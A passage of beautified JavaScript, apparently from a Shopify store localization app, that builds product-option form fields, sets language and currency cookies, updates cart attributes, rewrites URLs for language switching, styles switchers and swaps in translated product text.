                                i.setAttribute("type", "hidden"),
                                    i.name = "properties[" + d.escape(a.name[d.currentLang]) + "]",
                                    i.id = "Property-" + (Math.floor(8888 * Math.random()) + 1111) + "-hidden",
                                    e.push(i),
                                    a.values.forEach(function(b) {
                                        var c = d.currentLang in b ? d.currentLang : d.defaultLang in b ? d.defaultLang : null;
                                        if (c) {
                                            var f = "Property-" + (Math.floor(8888 * Math.random()) + 1111)
                                                , g = document.createElement("LABEL");
                                            g.setAttribute("for", f),
                                                g.innerHTML = "<input class='" + i.id + "' id='" + f + "' type='checkbox' value='" + d.escape(b[c]) + "'>" + d.escape(b[c]),
                                                g.querySelector("input[type=checkbox]").addEventListener("change", function() {
                                                    i.value = "",
                                                        [].forEach.call(document.querySelectorAll("." + i.id), function(a) {
                                                            a.checked && (i.value += ", " + a.value)
                                                        }),
                                                    i.value && (i.value = i.value.substring(2))
                                                }),
                                            "input_class"in a && g.setAttribute("class", d.escape(a.input_class)),
                                                e.push(g)
                                        }
                                    })
                            }
                            break;
                        case "select":
                            if (a.values.length) {
                                b = 0;
                                var j = document.createElement("SELECT");
                                j.name = "properties[" + d.escape(a.name[d.currentLang]) + "]",
                                    j.id = f,
                                "input_class"in a && j.setAttribute("class", d.escape(a.input_class)),
                                "required"in a && parseInt(a.required, 10) && j.setAttribute("required", ""),
                                    a.values.forEach(function(a) {
                                        var c = d.currentLang in a ? d.currentLang : d.defaultLang in a ? d.defaultLang : null;
                                        if (c) {
                                            var e = document.createElement("OPTION");
                                            e.text = d.escape(a[c]),
                                                e.value = d.escape(a[c]),
                                                j.add(e, null),
                                                b++
                                        }
                                    }),
                                b && e.push(j)
                            }
                    }
                    return e
                },
                escape: function(a) {
                    return a.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\"/g, "&quot;").replace(/\'/g, "&#39;").trim()
                },
                patternReplace: function(a, b, c) {
                    var d = /[\{\{]{2}[a-zA-Z0-9._\s]{1,}[\}\}]{2}/i;
                    return d.test(a) && b && c ? a.replace(d, c) : a
                },
                getSearchParameters: function(a) {
                    var b = LS.localization
                        , c = a || window.location.search.substr(1);
                    return null !== c && c ? b.transformToAssocArray(c) : {}
                },
                transformToAssocArray: function(a) {
                    for (var b = {}, c = a.split("&"), d = 0; d < c.length; d++) {
                        var e = c[d].split("=");
                        b[e[0]] = e[1]
                    }
                    return b
                },
                cartLangUpdate: function(a, b, c) {
                    var d = LS.localization
                        , e = {};
                    a && (e.LS_language = a,
                        d.languageInCart = a),
                    c && (e.LS_currency = c);
                    var f = new XMLHttpRequest;
                    f.onreadystatechange = function() {
                        4 === f.readyState && 200 === f.status && "domains" !== d.urlModifyType && a && b && !d.buildify && location.reload()
                    }
                        ,
                        f.open("POST", "/cart/update.js", !0),
                        f.setRequestHeader("Content-Type", "application/json;charset=UTF-8"),
                        f.send(JSON.stringify({
                            attributes: e
                        }))
                },
                checkUrlParams: function() {
                    var a = LS.localization
                        , b = a.getCookie("ls_lang");
                    if (a.buildify)
                        return a.buildify;
                    b && a.languages.map(function(a) {
                        return a.lang_id
                    }).indexOf(b) < 0 && (b = "");
                    var c = "_sc"in a.urlParams && 1 === parseInt(a.urlParams._sc, 10) || "preview_theme_id"in a.urlParams;
                    if ("1" === a.urlModify && !c) {
                        a.currUrlPrefix in a.urlParams && "disabled" !== a.currSwitcherType && "object" == typeof a.currencies && (a.currencies.map(function(a) {
                            return a.currId
                        }).indexOf(a.urlParams[a.currUrlPrefix]) >= 0 ? a.urlParams[a.currUrlPrefix] !== a.currency && (a.setCookie("ls_curr", a.urlParams[a.currUrlPrefix], 30),
                            a.currency = a.urlParams[a.currUrlPrefix]) : (LS.location = LS.location.replace(a.currUrlPrefix + "=" + a.urlParams[a.currUrlPrefix], a.currUrlPrefix + "=" + a.currency),
                            a.urlParams[a.currUrlPrefix] = a.currency));
                        var d;
                        if (a.getUrlPrefix in a.urlParams && "get" === a.urlModifyType) {
                            for (d = 0; d < a.languages.length; d++)
                                if (a.languages[d].lang_id === a.urlParams[a.getUrlPrefix] && ("get" === a.urlModifyType || !a.urlHash))
                                    return a.urlParams[a.getUrlPrefix];
                            LS.location = LS.location.replace(a.getUrlPrefix + "=" + a.urlParams[a.getUrlPrefix], a.getUrlPrefix + "=" + a.defaultLang),
                                window.history.replaceState(null, null, LS.location)
                        } else if ("hash" === a.urlModifyType) {
                            for (d = 0; d < a.languages.length; d++)
                                if (a.urlHash === a.languages[d].lang_id)
                                    return a.urlHash;
                            location.hash && (location.hash = a.currentLang)
                        } else if ("domains" === a.urlModifyType && a.mdomains) {
                            b && !a.languageInCart && (a.languageInCart = b,
                                a.cartLangUpdate(b, !1, a.getCookie("ls_curr")));
                            var e = !0
                                , f = JSON.parse(a.mdomains)
                                , g = document.referrer ? new URL(document.referrer).hostname : "";
                            if (f) {
                                var h;
                                for (h in f)
                                    f.hasOwnProperty(h) && (f[h].split(",").indexOf(g) >= 0 || g.indexOf("langshop.") >= 0) && (e = !1);
                                for (h in f)
                                    if (f.hasOwnProperty(h) && f[h].split(",").indexOf(window.location.host) >= 0) {
                                        if (a.languageInCart || "browser" !== a.detectingLanguage && "geolocation" !== a.detectingLanguage || !e)
                                            return h;
                                        if (h === a.defaultLang)
                                            return h
                                    }
                                if (a.defaultLang in f) {
                                    var i = f[a.defaultLang].split(",")
                                        , j = window.location;
                                    j = j.toString(),
                                        j = j.replace(window.location.host, i[0]),
                                        window.location = j
                                }
                            }
                        }
                    }
                    return b || a.defaultLang
                },
                setCookie: function(a, b, c) {
                    var d = "";
                    if (void 0 !== c) {
                        var e = new Date;
                        e.setTime(e.getTime() + 24 * c * 60 * 60 * 1e3),
                            d = "; expires=" + e.toUTCString()
                    }
                    document.cookie = a + "=" + b + d + "; path=/"
                },
                getCookie: function(a) {
                    for (var b = a + "=", c = document.cookie.split(";"), d = 0; d < c.length; d++) {
                        for (var e = c[d]; " " === e.charAt(0); )
                            e = e.substring(1);
                        if (0 === e.indexOf(b))
                            return e.substring(b.length, e.length)
                    }
                    return ""
                },
                getClickAncestor: function(a, b) {
                    for (b = b.toUpperCase(); a; ) {
                        if (1 === a.nodeType && a.nodeName === b)
                            return a;
                        a = a.parentNode
                    }
                    return null
                },
                styleGenerator: function(a, b, c, d) {
                    if (b || (b = "ls-style-theme-a"),
                    "1" !== b || "select" === c) {
                        var e = ""
                            , f = document.head || document.getElementsByTagName("head")[0]
                            , g = document.createElement("style");
                        switch (a = "#" + a,
                            d.position_type) {
                            case "fixed-right-bottom":
                                e += a + " { top: auto!important; position: fixed; bottom:" + d.offset_bottom + d.offset_dimension + ";right:" + d.offset_right + d.offset_dimension + "; }";
                                break;
                            case "fixed-left-bottom":
                                e += a + " { top: auto!important; position: fixed; bottom:" + d.offset_bottom + d.offset_dimension + ";left:" + d.offset_left + d.offset_dimension + "; }";
                                break;
                            case "fixed-right-top":
                                e += a + " { position: fixed; top:" + d.offset_top + d.offset_dimension + ";right:" + d.offset_right + d.offset_dimension + "; }";
                                break;
                            case "fixed-left-top":
                                e += a + " { position: fixed; top:" + d.offset_top + d.offset_dimension + ";left:" + d.offset_left + d.offset_dimension + "; }"
                        }
                        if (e += a + " ul { color:" + d.main_font_color + ";",
                            e += "ls-style-theme-b" !== b ? "background-color:" + d.main_bg_color + ";}" : "}",
                        "li-vertical-non-flags" === c || "li-vertical-non-text" === c || "li-vertical" === c)
                            switch (d.dropdown_direction) {
                                case "fixed-right-bottom":
                                    e += a + " ul { top: 100%;bottom: auto;right: auto;left: 0;-webkit-transform-origin: -50% 0;transform-origin: -50% 0; }";
                                    break;
                                case "fixed-left-bottom":
                                    e += a + " ul { top: 100%;bottom: auto;right: 0;left: auto;-webkit-transform-origin: 150% 0;transform-origin: 150% 0; }";
                                    break;
                                case "fixed-right-top":
                                    e += a + " ul { top: auto;bottom: 100%;right: auto;left: 0;-webkit-transform-origin: 0 150%;transform-origin: 0 150%; }";
                                    break;
                                case "fixed-left-top":
                                    e += a + " ul { top: auto;bottom: 100%;right: 0;left: auto;-webkit-transform-origin: 100% 150%;transform-origin: 100% 150%; }"
                            }
                        e += a + " ul li:not(.ls-curr-switcher-active):not(.ls-lang-switcher-active) { border: 1px solid " + d.main_border_color + ";",
                            e += "ls-style-theme-b" === b ? "background-color:" + d.main_bg_color + ";}" : "}",
                            e += a + " ul li:not(.ls-curr-switcher-active):not(.ls-lang-switcher-active):hover { border: 1px solid " + d.hover_main_border_color + ";color:" + d.hover_main_font_color + ";",
                            e += "background-color:" + d.hover_main_bg_color + ";}",
                            e += a + " .ls-curr-switcher-active," + a + " .ls-lang-switcher-active { ",
                            e += "background-color:" + d.active_bg_color + ";border: 1px solid " + d.active_border_color + ";color:" + d.active_font_color + ";",
                            e += "}",
                            e += a + " .ls-curr-switcher-active:hover," + a + " .ls-lang-switcher-active:hover { ",
                            e += "background-color:" + d.hover_active_bg_color + ";border: 1px solid " + d.hover_active_border_color + ";color:" + d.hover_active_font_color + ";",
                            e += "}",
                            e += a + " .ls-curr-switcher-active::after," + a + " .ls-lang-switcher-active::after { ",
                            e += "border-bottom: 2px solid " + d.hover_active_font_color + ";border-right: 2px solid " + d.hover_active_font_color + ";",
                            e += "}",
                            e += a + " .ls-curr-switcher-active:hover::after," + a + " .ls-lang-switcher-active::after { ",
                            e += "border-bottom: 2px solid " + d.active_font_color + ";border-right: 2px solid " + d.active_font_color + ";",
                            e += "}",
                            g.type = "text/css",
                            g.appendChild(document.createTextNode(e)),
                            f.appendChild(g)
                    }
                },
                encodeQueryData: function(a) {
                    var b = [];
                    for (var c in a)
                        a.hasOwnProperty(c) && b.push(encodeURIComponent(c) + "=" + encodeURIComponent(a[c]));
                    return b.join("&")
                },
                detectBuildify: function() {
                    function a() {
                        try {
                            return window.self !== window.top
                        } catch (a) {
                            return !0
                        }
                    }
                    var b = LS.localization;
                    return !!("buildify"in b.urlParams && a()) && ("lang"in b.urlParams && b.languages.map(function(a) {
                        return a.lang_id
                    }).indexOf(b.urlParams.lang) >= 0 ? b.urlParams.lang : b.defaultLang)
                },
                init: function() {
                    var a = LS.localization;
                    a.urlParams = a.getSearchParameters(),
                        a.buildify = a.detectBuildify();
                    var b = a.checkUrlParams()
                        , c = !0;
                    if ("1" === a.urlModify && "get" === a.urlModifyType && a.getUrlPrefix in a.urlParams && "cache"in a.urlParams == !1 && a.botCheck())
                        return a.urlParams.cache = "false",
                            void (document.location.search = a.encodeQueryData(a.urlParams));
                    if ("1" === a.urlModify && "get" === a.urlModifyType && "cache"in a.urlParams && "false" === a.urlParams.cache && (c = !1),
                    "1" === a.urlModify && "domains" === a.urlModifyType && a.mdomains && (c = !1),
                        b === a.currentLang && a.languageInCart ? "domains" === a.urlModifyType && a.mdomains && a.currentLang !== a.languageInCart && (a.setCookie("ls_lang", a.currentLang, 30),
                            a.cartLangUpdate(a.currentLang, !1, a.getCookie("ls_curr"))) : (a.setCookie("ls_lang", b, 30),
                            a.cartLangUpdate(b, c, a.getCookie("ls_curr"))),
                    "1" === a.urlModify) {
                        var d = a.getUrlPrefix
                            , e = a.currUrlPrefix
                            , f = window.location.protocol + "//" + window.location.hostname + window.location.pathname + window.location.search;
                        "hash" === a.urlModifyType ? location.hash || a.currentLang !== a.getCookie("ls_lang") || (location.hash = a.currentLang) : "get" === a.urlModifyType && d in a.urlParams == !1 && a.currentLang === a.getCookie("ls_lang") && (window.location.search ? (f += "&" + d + "=" + a.currentLang,
                            window.history.replaceState(null, null, f + window.location.hash)) : (f += "?" + d + "=" + a.currentLang,
                            window.history.replaceState(null, null, f + window.location.hash)),
                            a.urlParams[d] = a.currentLang,
                            LS.location = f),
                        "disabled" !== a.currSwitcherType && "object" == typeof a.currencies && e in a.urlParams == !1 && a.currency && a.getCookie("ls_curr") && (f += (f.indexOf("?") >= 0 ? "&" : "?") + e + "=" + a.currency,
                            window.history.replaceState(null, null, f + window.location.hash),
                            a.urlParams[e] = a.currency,
                            LS.location = f)
                    }
                }
            },
            this.priceonhover = {
                init: function() {
                    var a = LS.localization;
                    if ("1" === a.defaultCurrOnHover && a.switchersStyleSets && "defaultCurrHoverStyles"in a.switchersStyleSets) {
                        var b = ""
                            , c = document.head || document.getElementsByTagName("head")[0]
                            , d = document.createElement("style")
                            , e = a.switchersStyleSets.defaultCurrHoverStyles
                            , f = e.font_size ? e.font_size : "14";
                        b += "body *:hover>.LS_converted_currencies.LS_show_on_hover:after { top: calc(50% - " + Math.ceil((parseInt(f, 10) + 10) / 2) + "px)!important; background: " + e.background_color + "!important; font-size: " + f + "px!important; color: " + e.font_color + "!important; }",
                            b += "body *:hover>.LS_converted_currencies.LS_show_on_hover:before { border-right: 5px solid " + e.background_color + "!important; }",
                            d.type = "text/css",
                            d.appendChild(document.createTextNode(b)),
                            c.appendChild(d)
                    }
                }
            }
    }
    function LangShopProducts() {}
    LangShopProducts.prototype.push = function(a, b) {
        if (a && a.hasOwnProperty("handle")) {
            var c = LS.localization.currentLang
                , d = LS.localization.defaultLang;
            if (c === d)
                return void (this[a.handle] = {
                    original: a,
                    locale: function() {
                        return this.original
                    }
                });
            var e = JSON.parse(JSON.stringify(a));
            if (c + "_title"in b && b[c + "_title"] && (a.title = b[c + "_title"]),
            c + "_body_html"in b && b[c + "_body_html"] && (a.content = b[c + "_body_html"],
                a.description = b[c + "_body_html"]),
            c + "_option1"in b && b[c + "_option1"] && "options"in a && void 0 !== a.options[0] && (a.options[0] = b[c + "_option1"]),
            c + "_option2"in b && b[c + "_option2"] && "options"in a && void 0 !== a.options[1] && (a.options[1] = b[c + "_option2"]),
            c + "_option3"in b && b[c + "_option3"] && "options"in a && void 0 !== a.options[2] && (a.options[2] = b[c + "_option3"]),
            a.variants && a.variants.length && !document.querySelector(".swatch"))
                for (var f = 0; f < a.variants.length; f++)
                    if (b.variants.hasOwnProperty(a.variants[f].id)) {
                        var g = []
                            , h = a.variants[f].id;
                        ["option1", "option2", "option3"].forEach(function(d, e) {
                            null !== a.variants[f][d] && c + "_variant_" + d in b.variants[h] && b.variants[h][c + "_variant_" + d] && (a.variants[f][d] = b.variants[h][c + "_variant_" + d],
                                a.variants[f].options[e] = b.variants[h][c + "_variant_" + d]),
                            a.variants[f][d] && g.push(a.variants[f][d])
                        }),
                            a.variants[f].public_title = a.variants[f].title = g.join(" / "),
                            a.variants[f].name = a.title + " - " + a.variants[f].title
                    }
            this[a.handle] = {
                original: e,
                translated: a,
                locale: function() {
                    return this.translated
                }
            }
        }
    }
        ,
        window.LS = new LangShop
}(),
    function() {
        "use strict";
        function a(a) {
            var b = document.implementation.createHTMLDocument("New").body;
            b.innerHTML = a;
            var c = b.textContent || b.innerText || "";
            return c = c.trim(),
                c.length > 220 ? c.substring(0, 220) + " ..." : c
        }
        function b(b, c) {
            if (c && "object" == typeof LS && void 0 !== LS.product && LS.product.hasOwnProperty(c.handle)) {
                var d = LS.product[c.handle].locale()
                    , e = document.getElementById("sca-qv-title")
                    , f = document.getElementById("sca-qv-des")
                    , g = document.querySelector("#sca-qv-price-container .sca-qv-product-price")
                    , h = document.getElementById("sca-qv-variant-options");
                if (e && (e.innerHTML = "<strong>" + d.title + "</strong>"),
                f && (f.innerHTML = a(d.description)),
                    g) {
                    var i = LS.localization.formatMoney(c.price);
                    c.compare_at_price && c.compare_at_price > c.price && (i += "<del class='sca-qv-product-compare-price'>" + LS.localization.formatMoney(c.compare_at_price) + "</del>"),
                        g.innerHTML = i
                }
                if (h) {
                    var j = h.querySelectorAll(".single-option-selector");
                    j.length && [].forEach.call(j, function(a) {
                        var b, c = a.getAttribute("data-option");
                        switch (c) {
                            case "option1":
                                b = 0;
                                break;
                            case "option2":
                                b = 1;
                                break;
                            case "option3":
                                b = 2
                        }
                        if (void 0 !== b && d.options[b] && a.previousSibling) {
                            a.previousSibling.innerHTML = d.options[b];
                            var e = a.options.length;
                            if (e)
                                for (var f = 0; f < e; f++) {
                                    var g = a[f].innerText;
                                    for (var h in d.variants)
                                        if (d.variants.hasOwnProperty(h)) {
                                            var i = d.variants[h].options.indexOf(g);
                                            if (i >= 0) {
                                                var j = d.variants[h]["option" + (i + 1)];
                                                j && (a[f].innerText = j);
                                                break
                                            }
                                        }
                                }
                        }
                    })
                }
            }
        }
        window.sca_default_callback_function || (window.sca_default_callback_function = b)
    }();
